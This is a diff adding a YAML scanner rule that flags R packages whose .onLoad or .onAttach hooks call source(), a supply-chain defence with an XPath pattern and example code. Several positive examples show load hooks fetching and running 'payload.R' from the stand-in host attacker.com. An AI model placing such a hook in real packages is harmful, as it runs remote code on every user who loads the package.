@@ -1,0 +1,88 @@
+name: onload_calls_source_rule
+version: "0.2.0"
+type: warning
+attck:
+  - T1059
+  - T1195.002
+message: >-
+  source() inside .onLoad or .onAttach executes R code automatically when a
+  package is loaded. The sourced file may be bundled with the package, read
+  from an ambient filesystem location (e.g., the working directory), or
+  fetched from a URL; in the latter two cases the payload can change after the
+  package passes review, bypassing static analysis. The origin of the argument
+  should be classified during manual review.
+description: >-
+  Flag base source() calls inside .onLoad or .onAttach. source() can accept
+  local file paths and URLs, making it a vector for load-time code execution.
+  Matches assignments using <-, =, or ->. Excludes method/slot calls such as
+  x$source() (e.g., loading JavaScript into a V8 context via ctx$source()) and
+  x@source(), which dispatch on an object and are unrelated to base source().
+xpath: >-
+  (//expr | //expr_or_assign_or_help)[
+    (
+      (LEFT_ASSIGN or EQ_ASSIGN)
+      and expr[1]/SYMBOL[text() = '.onLoad' or text() = '.onAttach']
+      and expr[FUNCTION]/descendant::SYMBOL_FUNCTION_CALL[
+        text() = 'source'
+        and not(preceding-sibling::OP-DOLLAR)
+        and not(preceding-sibling::OP-AT)
+      ]
+    )
+    or
+    (
+      RIGHT_ASSIGN
+      and expr[2]/SYMBOL[text() = '.onLoad' or text() = '.onAttach']
+      and expr[1]//SYMBOL_FUNCTION_CALL[
+        text() = 'source'
+        and not(preceding-sibling::OP-DOLLAR)
+        and not(preceding-sibling::OP-AT)
+      ]
+    )
+  ]
+example_positive:
+  - |
+    .onLoad <- function(libname, pkgname) {
+      source(url("https://attacker.com/payload.R"))
+    }
+  - |
+    .onAttach <- function(libname, pkgname) {
+      source("https://attacker.com/payload.R")
+    }
+  - |
+    .onLoad = function(libname, pkgname) {
+      source(url("https://attacker.com/payload.R"))
+    }
+  - |
+    (function(libname, pkgname) {
+      source("https://attacker.com/payload.R")
+    }) -> .onLoad
+  - |
+    .onLoad <- function(libname, pkgname) {
+      source(file.path(getwd(), "bootstrap.R"))
+    }
+  - |
+    .onLoad <- function(libname, pkgname) {
+      base::source("setup.R")
+    }
+example_negative:
+  - |
+    load_defaults <- function(path) {
+      source(path)
+    }
+  - |
+    .onUnload <- function(libpath) {
+      source("cleanup.R")
+    }
+  - |
+    .onLoad <- function(libname, pkgname) {
+      ctx <- V8::v8()
+      ctx$source(system.file("js/foo.js", package = pkgname))
+    }
+  - |
+    .onLoad <- function(libname, pkgname) {
+      .env$ct$source(file.path(root, "ajv.js"))
+    }
+  - |
+    .onLoad <- function(libname, pkgname) {
+      engine@source("payload.R")
+    }
